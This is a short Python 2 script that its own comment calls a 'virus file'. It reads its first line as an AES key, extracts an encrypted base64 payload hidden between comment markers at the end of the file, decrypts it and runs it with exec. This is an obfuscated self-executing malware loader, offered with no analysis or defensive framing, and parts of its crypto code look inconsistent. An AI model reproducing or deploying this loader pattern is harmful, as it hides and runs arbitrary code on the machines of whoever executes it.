######################################################## First script python
# coding=utf-8
import os                        
import __main__                                     
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES
from Crypto import Random

def encrypt(data):
   if len(data) % 8 != 0:
      toAdd = 8 - len(data) % 8
      print 'Ecryption DES ' + str(toAdd)

   this = open(__main__.__file__, 'r')
   key = this.readline()
   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   encrypted = iv + cipher.encrypt(data)

   #missing_padding = 4 - len(data) % 4
   #if missing_padding != 0:
    #    data += b'='* missing_padding
     #   print 'Encryption Missing padding ' + str(missing_padding)

   return base64.b64encode(encrypted)

# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   key = this.readline()
   this.close()

   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '#Start payload':
      copy = True
   elif line.strip() == '#End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload)
print e
exec e

sys.exit('Good job!')
#Start payload
#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
#End payload